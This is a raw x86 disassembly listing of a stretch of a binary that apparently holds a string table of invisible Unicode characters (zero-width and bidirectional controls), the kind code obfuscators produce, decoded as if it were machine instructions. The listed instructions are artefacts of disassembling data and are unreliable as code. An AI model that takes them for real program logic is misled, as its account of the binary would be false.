  40ae5e:	ae                   	scas   %es:(%edi),%al
  40ae5f:	00 e2                	add    %ah,%dl
  40ae61:	80 8c e2 80 ae e2 81 	orb    $0xae,-0x7e1d5180(%edx,%eiz,8)
  40ae68:	ae 
  40ae69:	e2 80                	loop   0x40adeb
  40ae6b:	ad                   	lods   %ds:(%esi),%eax
  40ae6c:	e2 81                	loop   0x40adef
  40ae6e:	aa                   	stos   %al,%es:(%edi)
  40ae6f:	e2 80                	loop   0x40adf1
  40ae71:	8f                   	(bad)
  40ae72:	e2 81                	loop   0x40adf5
  40ae74:	ac                   	lods   %ds:(%esi),%al
  40ae75:	e2 81                	loop   0x40adf8
  40ae77:	ab                   	stos   %eax,%es:(%edi)
  40ae78:	e2 80                	loop   0x40adfa
  40ae7a:	ac                   	lods   %ds:(%esi),%al
  40ae7b:	e2 80                	loop   0x40adfd
  40ae7d:	ac                   	lods   %ds:(%esi),%al
  40ae7e:	e2 80                	loop   0x40ae00
  40ae80:	8b e2                	mov    %edx,%esp
  40ae82:	80 ab e2 80 8c e2 81 	subb   $0x81,-0x1d737f1e(%ebx)
  40ae89:	ae                   	scas   %es:(%edi),%al
  40ae8a:	e2 80                	loop   0x40ae0c
  40ae8c:	8b e2                	mov    %edx,%esp
  40ae8e:	80 8f e2 80 8e e2 80 	orb    $0x80,-0x1d717f1e(%edi)
  40ae95:	8d                   	lea    (bad),%esp
  40ae96:	e2 80                	loop   0x40ae18
  40ae98:	8c e2                	mov    %fs,%edx
  40ae9a:	81 aa e2 80 aa e2 80 	subl   $0x80e28d80,-0x1d557f1e(%edx)
  40aea1:	8d e2 80 
  40aea4:	8c e2                	mov    %fs,%edx
  40aea6:	80 ab e2 80 ac e2 80 	subb   $0x80,-0x1d537f1e(%ebx)
  40aead:	8f                   	(bad)
  40aeae:	e2 80                	loop   0x40ae30
  40aeb0:	ad                   	lods   %ds:(%esi),%eax
  40aeb1:	e2 80                	loop   0x40ae33
  40aeb3:	ae                   	scas   %es:(%edi),%al
  40aeb4:	e2 80                	loop   0x40ae36
  40aeb6:	ac                   	lods   %ds:(%esi),%al
  40aeb7:	e2 81                	loop   0x40ae3a
  40aeb9:	aa                   	stos   %al,%es:(%edi)
  40aeba:	e2 80                	loop   0x40ae3c
  40aebc:	aa                   	stos   %al,%es:(%edi)
  40aebd:	e2 80                	loop   0x40ae3f
  40aebf:	aa                   	stos   %al,%es:(%edi)
  40aec0:	e2 80                	loop   0x40ae42
  40aec2:	aa                   	stos   %al,%es:(%edi)
  40aec3:	e2 80                	loop   0x40ae45
  40aec5:	aa                   	stos   %al,%es:(%edi)
  40aec6:	e2 80                	loop   0x40ae48
  40aec8:	ac                   	lods   %ds:(%esi),%al
  40aec9:	e2 80                	loop   0x40ae4b
  40aecb:	ac                   	lods   %ds:(%esi),%al
  40aecc:	e2 80                	loop   0x40ae4e
  40aece:	ae                   	scas   %es:(%edi),%al
  40aecf:	e2 81                	loop   0x40ae52
  40aed1:	ab                   	stos   %eax,%es:(%edi)
  40aed2:	e2 80                	loop   0x40ae54
  40aed4:	ad                   	lods   %ds:(%esi),%eax
  40aed5:	e2 81                	loop   0x40ae58
  40aed7:	ae                   	scas   %es:(%edi),%al
  40aed8:	e2 80                	loop   0x40ae5a
  40aeda:	ae                   	scas   %es:(%edi),%al
  40aedb:	00 e2                	add    %ah,%dl
  40aedd:	81 ac e2 80 8d e2 80 	subl   $0x8d80e28f,-0x7f1d7280(%edx,%eiz,8)
  40aee4:	8f e2 80 8d 
  40aee8:	e2 81                	loop   0x40ae6b
  40aeea:	ac                   	lods   %ds:(%esi),%al
  40aeeb:	e2 80                	loop   0x40ae6d
  40aeed:	aa                   	stos   %al,%es:(%edi)
  40aeee:	e2 81                	loop   0x40ae71
  40aef0:	ae                   	scas   %es:(%edi),%al
  40aef1:	e2 81                	loop   0x40ae74
  40aef3:	ac                   	lods   %ds:(%esi),%al
  40aef4:	e2 80                	loop   0x40ae76
  40aef6:	aa                   	stos   %al,%es:(%edi)
  40aef7:	e2 80                	loop   0x40ae79
  40aef9:	8b e2                	mov    %edx,%esp
  40aefb:	81 ac e2 80 ab e2 81 	subl   $0xad80e2aa,-0x7e1d5480(%edx,%eiz,8)
  40af02:	aa e2 80 ad 
  40af06:	e2 80                	loop   0x40ae88
  40af08:	ab                   	stos   %eax,%es:(%edi)
  40af09:	e2 81                	loop   0x40ae8c
  40af0b:	ab                   	stos   %eax,%es:(%edi)
  40af0c:	e2 80                	loop   0x40ae8e
  40af0e:	ae                   	scas   %es:(%edi),%al
  40af0f:	e2 81                	loop   0x40ae92
  40af11:	ad                   	lods   %ds:(%esi),%eax
  40af12:	e2 80                	loop   0x40ae94
  40af14:	ae                   	scas   %es:(%edi),%al
  40af15:	e2 80                	loop   0x40ae97
  40af17:	ab                   	stos   %eax,%es:(%edi)
  40af18:	e2 80                	loop   0x40ae9a
  40af1a:	8f                   	(bad)
  40af1b:	e2 81                	loop   0x40ae9e
  40af1d:	ae                   	scas   %es:(%edi),%al
  40af1e:	e2 80                	loop   0x40aea0
  40af20:	ac                   	lods   %ds:(%esi),%al
  40af21:	e2 81                	loop   0x40aea4
  40af23:	ac                   	lods   %ds:(%esi),%al
  40af24:	e2 80                	loop   0x40aea6
  40af26:	ad                   	lods   %ds:(%esi),%eax
  40af27:	e2 81                	loop   0x40aeaa
  40af29:	ac                   	lods   %ds:(%esi),%al
  40af2a:	e2 80                	loop   0x40aeac
  40af2c:	8f                   	(bad)
  40af2d:	e2 80                	loop   0x40aeaf
  40af2f:	8e e2                	mov    %edx,%fs
  40af31:	80 ad e2 81 ad e2 80 	subb   $0x80,-0x1d527e1e(%ebp)
  40af38:	ab                   	stos   %eax,%es:(%edi)
  40af39:	e2 80                	loop   0x40aebb
  40af3b:	ad                   	lods   %ds:(%esi),%eax
  40af3c:	e2 80                	loop   0x40aebe
  40af3e:	ac                   	lods   %ds:(%esi),%al
  40af3f:	e2 80                	loop   0x40aec1
  40af41:	aa                   	stos   %al,%es:(%edi)
  40af42:	e2 80                	loop   0x40aec4
  40af44:	8e e2                	mov    %edx,%fs
  40af46:	80 ac e2 80 ad e2 81 	subb   $0xad,-0x7e1d5280(%edx,%eiz,8)
  40af4d:	ad 
  40af4e:	e2 80                	loop   0x40aed0
  40af50:	ad                   	lods   %ds:(%esi),%eax
  40af51:	e2 81                	loop   0x40aed4
  40af53:	ae                   	scas   %es:(%edi),%al
  40af54:	e2 80                	loop   0x40aed6
  40af56:	ae                   	scas   %es:(%edi),%al
  40af57:	00 e2                	add    %ah,%dl
  40af59:	81 ad e2 80 8e e2 80 	subl   $0x81e28b80,-0x1d717f1e(%ebp)
  40af60:	8b e2 81 
  40af63:	ac                   	lods   %ds:(%esi),%al
  40af64:	e2 81                	loop   0x40aee7
  40af66:	ae                   	scas   %es:(%edi),%al
  40af67:	e2 81                	loop   0x40aeea
  40af69:	ab                   	stos   %eax,%es:(%edi)
  40af6a:	e2 80                	loop   0x40aeec
  40af6c:	ac                   	lods   %ds:(%esi),%al
  40af6d:	e2 81                	loop   0x40aef0
  40af6f:	aa                   	stos   %al,%es:(%edi)
  40af70:	e2 80                	loop   0x40aef2
  40af72:	ac                   	lods   %ds:(%esi),%al
  40af73:	e2 81                	loop   0x40aef6
  40af75:	ae                   	scas   %es:(%edi),%al
  40af76:	e2 80                	loop   0x40aef8
  40af78:	8e e2                	mov    %edx,%fs
  40af7a:	80 8d e2 81 af e2 81 	orb    $0x81,-0x1d507e1e(%ebp)
  40af81:	af                   	scas   %es:(%edi),%eax
  40af82:	e2 80                	loop   0x40af04
  40af84:	8e e2                	mov    %edx,%fs
  40af86:	80 aa e2 80 ae e2 80 	subb   $0x80,-0x1d517f1e(%edx)
  40af8d:	8d                   	lea    (bad),%esp
  40af8e:	e2 81                	loop   0x40af11
  40af90:	ae                   	scas   %es:(%edi),%al
  40af91:	e2 80                	loop   0x40af13
  40af93:	aa                   	stos   %al,%es:(%edi)
  40af94:	e2 80                	loop   0x40af16
  40af96:	8e e2                	mov    %edx,%fs
  40af98:	80 ae e2 81 ac e2 80 	subb   $0x80,-0x1d537e1e(%esi)
  40af9f:	ae                   	scas   %es:(%edi),%al
  40afa0:	e2 80                	loop   0x40af22
  40afa2:	8b e2                	mov    %edx,%esp
  40afa4:	81 ae e2 80 8f e2 80 	subl   $0x80e28b80,-0x1d707f1e(%esi)
  40afab:	8b e2 80 
  40afae:	8d                   	lea    (bad),%esp
  40afaf:	e2 80                	loop   0x40af31
  40afb1:	ad                   	lods   %ds:(%esi),%eax
  40afb2:	e2 80                	loop   0x40af34
  40afb4:	8d                   	lea    (bad),%esp
  40afb5:	e2 80                	loop   0x40af37
  40afb7:	ae                   	scas   %es:(%edi),%al
  40afb8:	e2 80                	loop   0x40af3a
  40afba:	ab                   	stos   %eax,%es:(%edi)
  40afbb:	e2 80                	loop   0x40af3d
  40afbd:	aa                   	stos   %al,%es:(%edi)
  40afbe:	e2 81                	loop   0x40af41
  40afc0:	af                   	scas   %es:(%edi),%eax
  40afc1:	e2 80                	loop   0x40af43
  40afc3:	ad                   	lods   %ds:(%esi),%eax
  40afc4:	e2 80                	loop   0x40af46
  40afc6:	ac                   	lods   %ds:(%esi),%al
  40afc7:	e2 80                	loop   0x40af49
  40afc9:	ab                   	stos   %eax,%es:(%edi)
  40afca:	e2 80                	loop   0x40af4c
  40afcc:	ae                   	scas   %es:(%edi),%al
  40afcd:	e2 81                	loop   0x40af50
  40afcf:	ae                   	scas   %es:(%edi),%al
  40afd0:	e2 80                	loop   0x40af52
  40afd2:	ae                   	scas   %es:(%edi),%al
  40afd3:	00 e2                	add    %ah,%dl
  40afd5:	81 ad e2 81 ad e2 80 	subl   $0x81e2aa80,-0x1d527e1e(%ebp)
  40afdc:	aa e2 81 
  40afdf:	ad                   	lods   %ds:(%esi),%eax
  40afe0:	e2 80                	loop   0x40af62
  40afe2:	8b e2                	mov    %edx,%esp
  40afe4:	81 ad e2 81 aa e2 81 	subl   $0x80e2ab81,-0x1d557e1e(%ebp)
  40afeb:	ab e2 80 
  40afee:	8f                   	(bad)
  40afef:	e2 80                	loop   0x40af71
  40aff1:	8f                   	(bad)
  40aff2:	e2 80                	loop   0x40af74
  40aff4:	8d                   	lea    (bad),%esp
  40aff5:	e2 81                	loop   0x40af78
  40aff7:	ab                   	stos   %eax,%es:(%edi)
  40aff8:	e2 80                	loop   0x40af7a
  40affa:	aa                   	stos   %al,%es:(%edi)
  40affb:	e2 80                	loop   0x40af7d
  40affd:	aa                   	stos   %al,%es:(%edi)
  40affe:	e2 80                	loop   0x40af80
  40b000:	ad                   	lods   %ds:(%esi),%eax
  40b001:	e2 80                	loop   0x40af83
  40b003:	8d                   	lea    (bad),%esp
  40b004:	e2 81                	loop   0x40af87
  40b006:	ae                   	scas   %es:(%edi),%al
  40b007:	e2 80                	loop   0x40af89
  40b009:	aa                   	stos   %al,%es:(%edi)
  40b00a:	e2 81                	loop   0x40af8d
  40b00c:	ae                   	scas   %es:(%edi),%al
  40b00d:	e2 81                	loop   0x40af90
  40b00f:	aa                   	stos   %al,%es:(%edi)
  40b010:	e2 80                	loop   0x40af92
  40b012:	ae                   	scas   %es:(%edi),%al
  40b013:	e2 80                	loop   0x40af95
  40b015:	8e e2                	mov    %edx,%fs
  40b017:	80 8b e2 80 8e e2 80 	orb    $0x80,-0x1d717f1e(%ebx)
  40b01e:	8d                   	lea    (bad),%esp
  40b01f:	e2 80                	loop   0x40afa1
  40b021:	8d                   	lea    (bad),%esp
  40b022:	e2 80                	loop   0x40afa4
  40b024:	8e e2                	mov    %edx,%fs
  40b026:	81 ae e2 80 8d e2 80 	subl   $0x81e28b80,-0x1d727f1e(%esi)
  40b02d:	8b e2 81 
  40b030:	ad                   	lods   %ds:(%esi),%eax
  40b031:	e2 80                	loop   0x40afb3
  40b033:	aa                   	stos   %al,%es:(%edi)
  40b034:	e2 80                	loop   0x40afb6
  40b036:	8f                   	(bad)
  40b037:	e2 80                	loop   0x40afb9
  40b039:	ab                   	stos   %eax,%es:(%edi)
  40b03a:	e2 81                	loop   0x40afbd
  40b03c:	ac                   	lods   %ds:(%esi),%al
  40b03d:	e2 80                	loop   0x40afbf
  40b03f:	aa                   	stos   %al,%es:(%edi)
  40b040:	e2 81                	loop   0x40afc3
  40b042:	ad                   	lods   %ds:(%esi),%eax
  40b043:	e2 80                	loop   0x40afc5
  40b045:	8b e2                	mov    %edx,%esp
  40b047:	81 ae e2 81 ae e2 80 	subl   $0xe200ae80,-0x1d517e1e(%esi)
  40b04e:	ae 00 e2 
  40b051:	81 af e2 80 ad e2 81 	subl   $0x81e2ac81,-0x1d527f1e(%edi)
  40b058:	ac e2 81 
  40b05b:	ac                   	lods   %ds:(%esi),%al
  40b05c:	e2 80                	loop   0x40afde
  40b05e:	aa                   	stos   %al,%es:(%edi)
  40b05f:	e2 80                	loop   0x40afe1
  40b061:	8c e2                	mov    %fs,%edx
  40b063:	81 aa e2 80 ab e2 80 	subl   $0x81e28b80,-0x1d547f1e(%edx)
  40b06a:	8b e2 81 
  40b06d:	af                   	scas   %es:(%edi),%eax
  40b06e:	e2 80                	loop   0x40aff0
  40b070:	ad                   	lods   %ds:(%esi),%eax
  40b071:	e2 80                	loop   0x40aff3
  40b073:	8e e2                	mov    %edx,%fs
  40b075:	81 ae e2 81 ab e2 81 	subl   $0x80e2af81,-0x1d547e1e(%esi)
  40b07c:	af e2 80 
  40b07f:	8d                   	lea    (bad),%esp
  40b080:	e2 81                	loop   0x40b003
  40b082:	ae                   	scas   %es:(%edi),%al
  40b083:	e2 81                	loop   0x40b006
  40b085:	ab                   	stos   %eax,%es:(%edi)
  40b086:	e2 81                	loop   0x40b009
  40b088:	ab                   	stos   %eax,%es:(%edi)
  40b089:	e2 80                	loop   0x40b00b
  40b08b:	ab                   	stos   %eax,%es:(%edi)
  40b08c:	e2 80                	loop   0x40b00e
  40b08e:	8f                   	(bad)
  40b08f:	e2 80                	loop   0x40b011
  40b091:	ae                   	scas   %es:(%edi),%al
  40b092:	e2 80                	loop   0x40b014
  40b094:	ae                   	scas   %es:(%edi),%al
  40b095:	e2 80                	loop   0x40b017
  40b097:	8b e2                	mov    %edx,%esp
  40b099:	80 8f e2 80 8b e2 80 	orb    $0x80,-0x1d747f1e(%edi)
  40b0a0:	8d                   	lea    (bad),%esp
  40b0a1:	e2 80                	loop   0x40b023
  40b0a3:	ae                   	scas   %es:(%edi),%al
  40b0a4:	e2 80                	loop   0x40b026
  40b0a6:	8f                   	(bad)
  40b0a7:	e2 80                	loop   0x40b029
  40b0a9:	8d                   	lea    (bad),%esp
  40b0aa:	e2 80                	loop   0x40b02c
  40b0ac:	8f                   	(bad)
  40b0ad:	e2 80                	loop   0x40b02f
  40b0af:	aa                   	stos   %al,%es:(%edi)
  40b0b0:	e2 81                	loop   0x40b033
  40b0b2:	ae                   	scas   %es:(%edi),%al
  40b0b3:	e2 80                	loop   0x40b035
  40b0b5:	8b e2                	mov    %edx,%esp
  40b0b7:	81 ac e2 80 ad e2 80 	subl   $0xae80e2ab,-0x7f1d5280(%edx,%eiz,8)
  40b0be:	ab e2 80 ae 
  40b0c2:	e2 81                	loop   0x40b045
  40b0c4:	af                   	scas   %es:(%edi),%eax
  40b0c5:	e2 81                	loop   0x40b048
  40b0c7:	ae                   	scas   %es:(%edi),%al
  40b0c8:	e2 80                	loop   0x40b04a
  40b0ca:	ae                   	scas   %es:(%edi),%al
  40b0cb:	00 e2                	add    %ah,%dl
  40b0cd:	81 ab e2 80 8d e2 81 	subl   $0x80e2ad81,-0x1d727f1e(%ebx)
  40b0d4:	ad e2 80 
  40b0d7:	ab                   	stos   %eax,%es:(%edi)
  40b0d8:	e2 80                	loop   0x40b05a
  40b0da:	aa                   	stos   %al,%es:(%edi)
  40b0db:	e2 80                	loop   0x40b05d
  40b0dd:	ac                   	lods   %ds:(%esi),%al
  40b0de:	e2 80                	loop   0x40b060
  40b0e0:	8c e2                	mov    %fs,%edx
  40b0e2:	81 ad e2 81 ac e2 81 	subl   $0x81e2af81,-0x1d537e1e(%ebp)
  40b0e9:	af e2 81 
  40b0ec:	aa                   	stos   %al,%es:(%edi)
  40b0ed:	e2 80                	loop   0x40b06f
  40b0ef:	aa                   	stos   %al,%es:(%edi)
  40b0f0:	e2 81                	loop   0x40b073
  40b0f2:	ae                   	scas   %es:(%edi),%al
  40b0f3:	e2 80                	loop   0x40b075
  40b0f5:	8f                   	(bad)
  40b0f6:	e2 81                	loop   0x40b079
  40b0f8:	ae                   	scas   %es:(%edi),%al
  40b0f9:	e2 80                	loop   0x40b07b
  40b0fb:	ab                   	stos   %eax,%es:(%edi)
  40b0fc:	e2 81                	loop   0x40b07f
  40b0fe:	ac                   	lods   %ds:(%esi),%al
  40b0ff:	e2 80                	loop   0x40b081
  40b101:	ae                   	scas   %es:(%edi),%al
  40b102:	e2 80                	loop   0x40b084
  40b104:	ad                   	lods   %ds:(%esi),%eax
  40b105:	e2 80                	loop   0x40b087
  40b107:	8d                   	lea    (bad),%esp
  40b108:	e2 81                	loop   0x40b08b
  40b10a:	ad                   	lods   %ds:(%esi),%eax
  40b10b:	e2 80                	loop   0x40b08d
  40b10d:	8b e2                	mov    %edx,%esp
  40b10f:	80 8d e2 81 aa e2 81 	orb    $0x81,-0x1d557e1e(%ebp)
  40b116:	af                   	scas   %es:(%edi),%eax
  40b117:	e2 80                	loop   0x40b099
  40b119:	ac                   	lods   %ds:(%esi),%al
  40b11a:	e2 80                	loop   0x40b09c
  40b11c:	ac                   	lods   %ds:(%esi),%al
  40b11d:	e2 80                	loop   0x40b09f
  40b11f:	8b e2                	mov    %edx,%esp
  40b121:	80 ab e2 80 ab e2 81 	subb   $0x81,-0x1d547f1e(%ebx)
  40b128:	aa                   	stos   %al,%es:(%edi)
  40b129:	e2 81                	loop   0x40b0ac
  40b12b:	ac                   	lods   %ds:(%esi),%al
  40b12c:	e2 81                	loop   0x40b0af
  40b12e:	af                   	scas   %es:(%edi),%eax
  40b12f:	e2 80                	loop   0x40b0b1
  40b131:	8c e2                	mov    %fs,%edx
  40b133:	81 ad e2 80 8e e2 80 	subl   $0x80e28d80,-0x1d717f1e(%ebp)
  40b13a:	8d e2 80 
  40b13d:	8c e2                	mov    %fs,%edx
  40b13f:	80 8d e2 81 af e2 80 	orb    $0x80,-0x1d507e1e(%ebp)
  40b146:	ae                   	scas   %es:(%edi),%al
  40b147:	00 e2                	add    %ah,%dl
  40b149:	80 aa e2 81 ad e2 81 	subb   $0x81,-0x1d527e1e(%edx)
  40b150:	ac                   	lods   %ds:(%esi),%al
  40b151:	e2 80                	loop   0x40b0d3
  40b153:	ae                   	scas   %es:(%edi),%al
  40b154:	e2 80                	loop   0x40b0d6
  40b156:	8f                   	(bad)
  40b157:	e2 81                	loop   0x40b0da
  40b159:	ac                   	lods   %ds:(%esi),%al
  40b15a:	e2 81                	loop   0x40b0dd
  40b15c:	ad                   	lods   %ds:(%esi),%eax
  40b15d:	e2 80                	loop   0x40b0df
  40b15f:	ae                   	scas   %es:(%edi),%al
  40b160:	e2 80                	loop   0x40b0e2
  40b162:	ab                   	stos   %eax,%es:(%edi)
  40b163:	e2 81                	loop   0x40b0e6
  40b165:	ae                   	scas   %es:(%edi),%al
  40b166:	e2 80                	loop   0x40b0e8
  40b168:	ac                   	lods   %ds:(%esi),%al
  40b169:	e2 81                	loop   0x40b0ec
  40b16b:	ae                   	scas   %es:(%edi),%al
  40b16c:	e2 81                	loop   0x40b0ef
  40b16e:	ad                   	lods   %ds:(%esi),%eax
  40b16f:	e2 80                	loop   0x40b0f1
  40b171:	8f                   	(bad)
  40b172:	e2 80                	loop   0x40b0f4
  40b174:	ab                   	stos   %eax,%es:(%edi)
  40b175:	e2 80                	loop   0x40b0f7
  40b177:	ac                   	lods   %ds:(%esi),%al
  40b178:	e2 81                	loop   0x40b0fb
  40b17a:	ab                   	stos   %eax,%es:(%edi)
  40b17b:	e2 80                	loop   0x40b0fd
  40b17d:	8e e2                	mov    %edx,%fs
  40b17f:	81 ae e2 81 af e2 80 	subl   $0x80e2ad80,-0x1d507e1e(%esi)
  40b186:	ad e2 80 
  40b189:	ad                   	lods   %ds:(%esi),%eax
  40b18a:	e2 80                	loop   0x40b10c
  40b18c:	ac                   	lods   %ds:(%esi),%al
  40b18d:	e2 80                	loop   0x40b10f
  40b18f:	aa                   	stos   %al,%es:(%edi)
  40b190:	e2 80                	loop   0x40b112
  40b192:	8b e2                	mov    %edx,%esp
  40b194:	80 aa e2 81 aa e2 80 	subb   $0x80,-0x1d557e1e(%edx)
  40b19b:	ac                   	lods   %ds:(%esi),%al
  40b19c:	e2 81                	loop   0x40b11f
  40b19e:	aa                   	stos   %al,%es:(%edi)
  40b19f:	e2 80                	loop   0x40b121
  40b1a1:	aa                   	stos   %al,%es:(%edi)
  40b1a2:	e2 80                	loop   0x40b124
  40b1a4:	8c e2                	mov    %fs,%edx
  40b1a6:	80 8d e2 80 ad e2 80 	orb    $0x80,-0x1d527f1e(%ebp)
  40b1ad:	8b e2                	mov    %edx,%esp
  40b1af:	80 ab e2 80 8b e2 80 	subb   $0x80,-0x1d747f1e(%ebx)
  40b1b6:	8c e2                	mov    %fs,%edx
  40b1b8:	81 ad e2 80 8e e2 81 	subl   $0x80e2af81,-0x1d717f1e(%ebp)
  40b1bf:	af e2 80 
  40b1c2:	ae                   	scas   %es:(%edi),%al
  40b1c3:	00 e2                	add    %ah,%dl
  40b1c5:	80 ac e2 80 ab e2 80 	subb   $0xae,-0x7f1d5480(%edx,%eiz,8)
  40b1cc:	ae 
  40b1cd:	e2 80                	loop   0x40b14f
  40b1cf:	8d                   	lea    (bad),%esp
  40b1d0:	e2 81                	loop   0x40b153
  40b1d2:	af                   	scas   %es:(%edi),%eax
  40b1d3:	e2 81                	loop   0x40b156
  40b1d5:	ac                   	lods   %ds:(%esi),%al
  40b1d6:	e2 80                	loop   0x40b158
  40b1d8:	8f                   	(bad)
  40b1d9:	e2 80                	loop   0x40b15b
  40b1db:	ad                   	lods   %ds:(%esi),%eax
  40b1dc:	e2 80                	loop   0x40b15e
  40b1de:	8d                   	lea    (bad),%esp
  40b1df:	e2 81                	loop   0x40b162
  40b1e1:	ad                   	lods   %ds:(%esi),%eax
  40b1e2:	e2 80                	loop   0x40b164
  40b1e4:	ac                   	lods   %ds:(%esi),%al
  40b1e5:	e2 81                	loop   0x40b168
  40b1e7:	ab                   	stos   %eax,%es:(%edi)
  40b1e8:	e2 81                	loop   0x40b16b
  40b1ea:	ae                   	scas   %es:(%edi),%al
  40b1eb:	e2 81                	loop   0x40b16e
  40b1ed:	af                   	scas   %es:(%edi),%eax
  40b1ee:	e2 81                	loop   0x40b171
  40b1f0:	ab                   	stos   %eax,%es:(%edi)
  40b1f1:	e2 81                	loop   0x40b174
  40b1f3:	ad                   	lods   %ds:(%esi),%eax
  40b1f4:	e2 80                	loop   0x40b176
  40b1f6:	8b e2                	mov    %edx,%esp
  40b1f8:	80 8c e2 80 ab e2 81 	orb    $0xad,-0x7e1d5480(%edx,%eiz,8)
  40b1ff:	ad 
  40b200:	e2 80                	loop   0x40b182
  40b202:	8f                   	(bad)
  40b203:	e2 80                	loop   0x40b185
  40b205:	8d                   	lea    (bad),%esp
  40b206:	e2 80                	loop   0x40b188
  40b208:	8e e2                	mov    %edx,%fs
  40b20a:	80 ae e2 80 ae e2 80 	subb   $0x80,-0x1d517f1e(%esi)
  40b211:	8e e2                	mov    %edx,%fs
  40b213:	80 8c e2 81 ae e2 80 	orb    $0x8e,-0x7f1d517f(%edx,%eiz,8)
  40b21a:	8e 
  40b21b:	e2 80                	loop   0x40b19d
  40b21d:	8d                   	lea    (bad),%esp
  40b21e:	e2 80                	loop   0x40b1a0
  40b220:	8d                   	lea    (bad),%esp
  40b221:	e2 81                	loop   0x40b1a4
  40b223:	aa                   	stos   %al,%es:(%edi)
  40b224:	e2 81                	loop   0x40b1a7
  40b226:	af                   	scas   %es:(%edi),%eax
  40b227:	e2 81                	loop   0x40b1aa
  40b229:	aa                   	stos   %al,%es:(%edi)
  40b22a:	e2 80                	loop   0x40b1ac
  40b22c:	8b e2                	mov    %edx,%esp
  40b22e:	80 ab e2 80 ad e2 80 	subb   $0x80,-0x1d527f1e(%ebx)
  40b235:	8d                   	lea    (bad),%esp
  40b236:	e2 80                	loop   0x40b1b8
  40b238:	aa                   	stos   %al,%es:(%edi)
  40b239:	e2 81                	loop   0x40b1bc
  40b23b:	af                   	scas   %es:(%edi),%eax
  40b23c:	e2 80                	loop   0x40b1be
  40b23e:	ae                   	scas   %es:(%edi),%al
  40b23f:	00 e2                	add    %ah,%dl
  40b241:	80 ad e2 80 8e e2 80 	subb   $0x80,-0x1d717f1e(%ebp)
  40b248:	ae                   	scas   %es:(%edi),%al
  40b249:	e2 80                	loop   0x40b1cb
  40b24b:	8e e2                	mov    %edx,%fs
  40b24d:	80 ad e2 80 aa e2 80 	subb   $0x80,-0x1d557f1e(%ebp)
  40b254:	ab                   	stos   %eax,%es:(%edi)
  40b255:	e2 81                	loop   0x40b1d8
  40b257:	ac                   	lods   %ds:(%esi),%al
  40b258:	e2 80                	loop   0x40b1da
  40b25a:	aa                   	stos   %al,%es:(%edi)
  40b25b:	e2 81                	loop   0x40b1de
  40b25d:	ab                   	stos   %eax,%es:(%edi)
  40b25e:	e2 81                	loop   0x40b1e1
  40b260:	aa                   	stos   %al,%es:(%edi)
  40b261:	e2 80                	loop   0x40b1e3
  40b263:	aa                   	stos   %al,%es:(%edi)
  40b264:	e2 80                	loop   0x40b1e6
  40b266:	aa                   	stos   %al,%es:(%edi)
  40b267:	e2 80                	loop   0x40b1e9
  40b269:	8f                   	(bad)
  40b26a:	e2 80                	loop   0x40b1ec
  40b26c:	aa                   	stos   %al,%es:(%edi)
  40b26d:	e2 81                	loop   0x40b1f0
  40b26f:	ad                   	lods   %ds:(%esi),%eax
  40b270:	e2 80                	loop   0x40b1f2
  40b272:	ad                   	lods   %ds:(%esi),%eax
  40b273:	e2 81                	loop   0x40b1f6
  40b275:	ae                   	scas   %es:(%edi),%al
  40b276:	e2 80                	loop   0x40b1f8
  40b278:	8e e2                	mov    %edx,%fs
  40b27a:	80 ac e2 81 ae e2 80 	subb   $0xae,-0x7f1d517f(%edx,%eiz,8)
  40b281:	ae 
  40b282:	e2 80                	loop   0x40b204
  40b284:	ac                   	lods   %ds:(%esi),%al
  40b285:	e2 80                	loop   0x40b207
  40b287:	ac                   	lods   %ds:(%esi),%al
  40b288:	e2 81                	loop   0x40b20b
  40b28a:	ad                   	lods   %ds:(%esi),%eax
  40b28b:	e2 81                	loop   0x40b20e
  40b28d:	ad                   	lods   %ds:(%esi),%eax
  40b28e:	e2 81                	loop   0x40b211
  40b290:	ae                   	scas   %es:(%edi),%al
  40b291:	e2 80                	loop   0x40b213
  40b293:	aa                   	stos   %al,%es:(%edi)
  40b294:	e2 81                	loop   0x40b217
  40b296:	ac                   	lods   %ds:(%esi),%al
  40b297:	e2 81                	loop   0x40b21a
  40b299:	ad                   	lods   %ds:(%esi),%eax
  40b29a:	e2 80                	loop   0x40b21c
  40b29c:	8c e2                	mov    %fs,%edx
  40b29e:	81 aa e2 80 ae e2 80 	subl   $0x80e28e80,-0x1d517f1e(%edx)
  40b2a5:	8e e2 80 
  40b2a8:	ae                   	scas   %es:(%edi),%al
  40b2a9:	e2 80                	loop   0x40b22b
  40b2ab:	8b e2                	mov    %edx,%esp
  40b2ad:	81 ad e2 80 8e e2 81 	subl   $0x81e2aa81,-0x1d717f1e(%ebp)
  40b2b4:	aa e2 81 
  40b2b7:	af                   	scas   %es:(%edi),%eax
  40b2b8:	e2 80                	loop   0x40b23a
  40b2ba:	ae                   	scas   %es:(%edi),%al
  40b2bb:	00 e2                	add    %ah,%dl
  40b2bd:	80 ad e2 80 8b e2 80 	subb   $0x80,-0x1d747f1e(%ebp)
  40b2c4:	8b e2                	mov    %edx,%esp
  40b2c6:	80 ab e2 80 aa e2 80 	subb   $0x80,-0x1d557f1e(%ebx)
  40b2cd:	aa                   	stos   %al,%es:(%edi)
  40b2ce:	e2 80                	loop   0x40b250
  40b2d0:	8d                   	lea    (bad),%esp
  40b2d1:	e2 81                	loop   0x40b254
  40b2d3:	ac                   	lods   %ds:(%esi),%al
  40b2d4:	e2 80                	loop   0x40b256
  40b2d6:	ac                   	lods   %ds:(%esi),%al
  40b2d7:	e2 80                	loop   0x40b259
  40b2d9:	ac                   	lods   %ds:(%esi),%al
  40b2da:	e2 81                	loop   0x40b25d
  40b2dc:	ae                   	scas   %es:(%edi),%al
  40b2dd:	e2 81                	loop   0x40b260
  40b2df:	af                   	scas   %es:(%edi),%eax
  40b2e0:	e2 80                	loop   0x40b262
  40b2e2:	8e e2                	mov    %edx,%fs
  40b2e4:	81 af e2 81 ac e2 80 	subl   $0x81e2aa80,-0x1d537e1e(%edi)
  40b2eb:	aa e2 81 
  40b2ee:	ae                   	scas   %es:(%edi),%al
  40b2ef:	e2 80                	loop   0x40b271
  40b2f1:	ac                   	lods   %ds:(%esi),%al
  40b2f2:	e2 81                	loop   0x40b275
  40b2f4:	aa                   	stos   %al,%es:(%edi)
  40b2f5:	e2 81                	loop   0x40b278
  40b2f7:	ae                   	scas   %es:(%edi),%al
  40b2f8:	e2 80                	loop   0x40b27a
  40b2fa:	aa                   	stos   %al,%es:(%edi)
  40b2fb:	e2 81                	loop   0x40b27e
  40b2fd:	ab                   	stos   %eax,%es:(%edi)
  40b2fe:	e2 80                	loop   0x40b280
  40b300:	8c e2                	mov    %fs,%edx
  40b302:	81 af e2 80 ac e2 80 	subl   $0x81e2aa80,-0x1d537f1e(%edi)
